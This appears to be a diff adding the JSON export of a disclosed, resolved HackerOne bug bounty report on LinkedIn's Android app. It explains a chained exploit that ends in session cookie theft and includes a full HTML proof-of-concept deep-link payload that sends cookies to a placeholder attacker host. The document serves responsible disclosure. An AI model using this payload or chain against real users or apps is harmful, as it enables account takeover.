@@ -1,0 +1,158 @@
+{
+  "id": 3475626,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNDc1NjI2",
+  "url": "https://hackerone.com/reports/3475626",
+  "title": "Session Cookie Leakage via Static Header Field in WebViewerFragment",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2025-12-22T19:32:36.820Z",
+  "submitted_at": "2025-12-22T19:32:37.156Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "dphoeniixx",
+    "url": "/dphoeniixx",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 58,
+    "url": "https://hackerone.com/linkedin",
+    "handle": "linkedin",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/058/3aaa858b18e9807c5c1fea0c559156568a6647cc_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/058/3aaa858b18e9807c5c1fea0c559156568a6647cc_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "LinkedIn",
+      "twitter_handle": "",
+      "website": "https://www.linkedin.com",
+      "about": "The world's largest professional network."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2026-03-17T06:13:57.005Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-03-14T01:46:55.158Z",
+  "team_member_agreed_on_going_public_at": "2026-03-17T06:13:56.635Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello LinkedIn Security Team,\n\nI was able to identify a vulnerability in the `WebViewerFragment` that can lead to leaking the user's cookies to a threat actor. Below, I will explain the finding and provide a PoC.\n\n## Summary\n\nA static field (`CUSTOM_HEADERS`) in `WebViewerFragment` persists cookies across different URL loads, allowing an attacker to chain multiple weaknesses to exfiltrate a victim's LinkedIn session cookies to an attacker-controlled server.\n\n## Root Cause\n\nWhile the exploitation is complex, the root cause is simple. In the `loadUrl` method of the vulnerable fragment:\n\n```java\npublic final void loadUrl(Uri uri0) {\n    String s = uri0.toString();\n    ...\n    if(this.shouldUseCookies) {\n        CookieManager cookieManager0 = CookieManager.getInstance();\n        ...\n        String s2 = cookieManager0.getCookie(s);\n        ArrayMap arrayMap0 = WebViewerFragment.CUSTOM_HEADERS; // Static field!\n        ...\n        if(s2 != null) {\n            arrayMap0.put(\"Cookie\", s2);\n        }\n        this.webView.loadUrl(s, arrayMap0);\n        return;\n    }\n    ...\n}\n```\n\nThe method retrieves cookies for the URL. If cookies exist, they are added to `WebViewerFragment.CUSTOM_HEADERS`.\n\n### The Problem\n\n`WebViewerFragment.CUSTOM_HEADERS` is a **static field that is never cleared** between loads. This means:\n\n1. If the vulnerable fragment opens website A (which has cookies), those cookies are stored in `CUSTOM_HEADERS`\n2. If website B is subsequently opened and has no saved cookies, the cookies from website A are still present in `CUSTOM_HEADERS` and will be sent to website B\n\n**Attack Flow:**\n1. Victim opens `https://www.linkedin.com` in the Fragment → LinkedIn cookies are saved to `CUSTOM_HEADERS`\n2. Victim opens the attacker's website in the Fragment → The LinkedIn cookies already in `CUSTOM_HEADERS` are leaked to the attacker\n\n## Exploitation Chain\n\nThere is no deep-link that directly opens the vulnerable fragment. After investigating the application, I discovered a path to reach it through chaining multiple weaknesses.\n\n### Step 1: Weak URL Validation in Verification WebView\n\nThe Verification WebView can be opened directly via the `https://www.linkedin.com/trust/verification` deep-link. The handler extracts the URL to load from the `verificationUrl` parameter and validates the host against a whitelist:\n\n```java\nif(!z2 && SearchFrameworkPrefetchRepositoryImpl..ExternalSyntheticOutline0.m(2, \"trust/verification\", s)) {\n    ...\n    String verificationUrl = uri0.getQueryParameter(\"verificationUrl\");\n    ...\n    intent8 = verificationUrlMappingImpl1.neptuneTrustVerification(verificationUrl, ...);\n    ...\n}\n```\n\n```java\npublic final Intent neptuneTrustVerification(String verificationUrl, ...) {\n    if(verificationUrl == null) {\n        uri1 = null;\n    } else {\n        uri1 = Uri.parse(s);\n        if(uri1.getScheme() == null) {\n            uri1 = null;\n        } else {\n            String host = uri1.getHost();\n            if(!CollectionsKt___CollectionsKt.contains(this.supportedUrls, host) || UriUtil.isSuspectedPathTraversalUri(uri1)) {\n                uri1 = null;\n            }\n        }\n    }\n    ...\n}\n```\n\n**Weakness:** While the host validation is secure, the scheme is not validated. An attacker can execute JavaScript in the WebView using the `javascript:` scheme. A URL like this will pass validation:\n\n```\njavascript://www.linkedin.com/%0aalert(1)\n```\n\nHowever, there is a complication. A parameter is appended to the URL before loading:\n\n```java\nUri.Builder uri$Builder1 = uri$Builder0.appendQueryParameter(\"renderContext\", \"trustVerificationDeeplink\");\n```\n\nThis transforms the payload into:\n```\njavascript://www.linkedin.com/%0aalert(1)?renderContext=trustVerificationDeeplink\n```\n\nThis is invalid JavaScript and will not execute.\n\n**Bypass:** I discovered that by opening a string and closing it after the `#` (fragment), the injected parameter becomes part of the string:\n\n```\njavascript://www.linkedin.com/%0aalert('1#')\n```\n\nWith the parameter appended, this becomes:\n```\njavascript://www.linkedin.com/%0aalert('1?renderContext=trustVerificationDeeplink#')\n```\n\nThis is valid JavaScript that executes successfully.\n\n### Step 2: From VerificationWebView to WebViewerFragment\n\nThe Verification WebView exposes a JavaScript Interface that can open the vulnerable fragment:\n\n```java\nif(verificationWebViewFeature$createJavascriptInterface$10 != null) {\n    webView0.addJavascriptInterface(verificationWebViewFeature$createJavascriptInterface$10, \"Android\");\n}\n```\n\n```java\npublic final class VerificationWebViewFeature.createJavascriptInterface.1 {\n    @JavascriptInterface\n    public final Unit sendWebMessage(String s) {\n        if(s != null) {\n            JSONObject jSONObject0 = s == null ? null : new JSONObject(s);\n            if(jSONObject0 != null) {\n                ...\n                Event event4 = new Event(jSONObject0);\n                verificationWebViewFeature0._receiveWebMessageLiveData.postValue(event4);\n                return Unit.INSTANCE;\n            }\n        }\n    }\n}\n```\n\nThe observer for `_receiveWebMessageLiveData` processes the message:\n\n```java\npublic final class VerificationWebViewFragment.createJSObserver.1 extends EventObserver {\n    ...\n    public final boolean onEvent(Object object0) {\n        ...\n        String s3 = VerificationWebViewFragment.getNonEmptyString(\"additionalWebViewUrl\", ((JSONObject)object0));\n        if(s3 != null) {\n            WebViewerBundle webViewerBundle0 = WebViewerBundle.create(s3, null, null);\n            verificationWebViewFragment0.webRouterUtil.launchWebViewer(webViewerBundle0);\n        }\n        ...\n    }\n}\n```\n\nCalling `Android.sendWebMessage(JSON.stringify({additionalWebViewUrl: \"https://www.linkedin.com\"}))` triggers `launchWebViewer` to open the URL.\n\n### Step 3: Forcing the Web Viewer Client\n\nThe `launchWebViewer` method uses interceptors to determine which client to use (Browser, Web Viewer, Custom Tabs). To ensure the vulnerable `WebViewerFragment` is used, we need to satisfy an interceptor that sets the client to `web_viewer`:\n\n```java\npublic class LinkedInUrlRequestInterceptor implements RequestInterceptor {\n    @Override\n    public final Request intercept(CurrentActivityGetter currentActivityGetter0, Request request0) {\n        Activity activity0 = currentActivityGetter0.get();\n        if(!WebViewerUtils.isLinkedInUrl(request0.url.toString()) && !WebViewerUtils.isLinkedInArticleUrl(request0.url.toString())) {\n            if(activity0 != null && !this.sharedPreferences.sharedPreferences.getBoolean(\"openWebUrlsInApp\", true)) {\n                request0.suggestedWebClientName = \"browser\";\n            }\n            return request0;\n        }\n        request0.suggestedWebClientName = \"web_viewer\";\n        return request0;\n    }\n    ...\n}\n```\n\nThe `isLinkedInArticleUrl` method uses a regex:\n\n```java\npublic class WebViewerUtils {\n    static {\n        WebViewerUtils.FIRST_PARTY_ARTICLE_PATTERN = Pattern.compile(\"(http|https)://www.linkedin(-ei)?.com/pulse/+\");\n    }\n    public static boolean isLinkedInArticleUrl(String s) {\n        if(!WebViewerUtils.PULSE_CHANNEL_PATTERN.matcher(s).find() && ...) {\n            if(WebViewerUtils.FIRST_PARTY_ARTICLE_PATTERN.matcher(s).find()) {\n                ...\n                return true;\n            }\n        }\n        ...\n    }\n}\n```\n\n**Weakness:** The regex does not use `^` anchor, so it matches anywhere in the URL. By appending `http://www.linkedin.com/pulse/1` to our URL, we can pass this check and force the vulnerable fragment to open.\n\n## Complete Attack Chain\n\n```\n┌─────────────────────────────────────────────────────────────────────────┐\n│ 1. Victim clicks malicious link                                         │\n│    └─→ Opens trust/verification deep-link with javascript: payload      │\n├─────────────────────────────────────────────────────────────────────────┤\n│ 2. JavaScript executes in VerificationWebView                           │\n│    └─→ Bypasses host validation via javascript://www.linkedin.com/      │\n│    └─→ Fragment trick (#) neutralizes injected query parameter          │\n├─────────────────────────────────────────────────────────────────────────┤\n│ 3. JavaScript calls Android.sendWebMessage()                            │\n│    └─→ First call: Opens https://www.linkedin.com/...                   │\n│    └─→ LinkedIn cookies stored in static CUSTOM_HEADERS                 │\n├─────────────────────────────────────────────────────────────────────────┤\n│ 4. After delay, second sendWebMessage() call                            │\n│    └─→ Opens attacker's server URL                                      │\n│    └─→ LinkedIn cookies in CUSTOM_HEADERS sent to attacker              │\n├─────────────────────────────────────────────────────────────────────────┤\n│ 5. Attacker receives victim's LinkedIn session cookies                  │\n│    └─→ Complete account takeover possible                               │\n└─────────────────────────────────────────────────────────────────────────┘\n```\n\n## Proof of Concept\n\n### Steps to Reproduce\n\n1. Host the following HTML on your server, replacing `{COLLABORATOR_HOST}` with your domain:\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <title>LinkedIn Cookie Leak PoC</title>\n</head>\n<body>\n    <a href=\"https://www.linkedin.com/trust/verification?verificationUrl=javascript://www.linkedin.com/%250asetTimeout%28%28%29%3D%3E%7BAndroid.sendWebMessage%28%27%7B%22additionalWebViewUrl%22%3A%22https%3A%2F%5Cu002f{COLLABORATOR_HOST}%2Fhttp%3A%2F%5Cu002fwww.linkedin.com%2Fpulse%2F1%22%7D%27%29%7D%2C%201000%29%3BAndroid.sendWebMessage%28%27%7B%22additionalWebViewUrl%22%3A%22https%3A%2F%5Cu002fwww.linkedin.com%2Fhttp%3A%2F%5Cu002fwww.linkedin.com%2Fpulse%2F1%23%22%7D%27%29%3B\">Click Here</a>\n</body>\n</html>\n```\n2. On an Android device with LinkedIn installed, open the HTML page in a mobile browser\n3. Tap \"Click Here\"\n4. You will see Linkedin is Opened on WebView.\n5. Once you go back or close the WebView, another WebView will launch redirecting to your collaborator server, leaking the cookies.\n6. Observe the leaked LinkedIn cookies in your server logs (Cookie header will contain LinkedIn session tokens)\n\n## Impact\n\n- **Complete session takeover** via stolen authentication cookies\n- Attacker gains **full access to victim's LinkedIn account**",
+  "weakness": {
+    "id": 145,
+    "name": "Misconfiguration"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 116,
+  "voters": [
+    "tomisec",
+    "k0ns0l",
+    "dphoeniixx",
+    "subhashdasyam",
+    "agate_",
+    "oub3ll4",
+    "santoryuhunter",
+    "zywac",
+    "aboalezz",
+    "supermancyber",
+    "and 106 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.1,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 61413,
+    "asset_type": "GOOGLE_PLAY_APP_ID",
+    "asset_identifier": "com.linkedin.android",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 831344,
+      "category": "researcher",
+      "content": "write-up: https://dphoeniixx.medium.com/normal-usage-of-linkedin-leaks-your-secrets-74aa968850fd",
+      "updated_at": "2026-03-17T08:03:55.455Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 145161,
+        "username": "dphoeniixx",
+        "name": "Sayed Abdelhafiz",
+        "bio": "A muslim",
+        "cleared": true,
+        "verified": true,
+        "website": null,
+        "location": "",
+        "created_at": "2017-02-22T19:06:21.730Z",
+        "url": "https://hackerone.com/dphoeniixx",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "medium": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png",
+          "xtralarge": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+        }
+      }
+    }
+  ]
+}
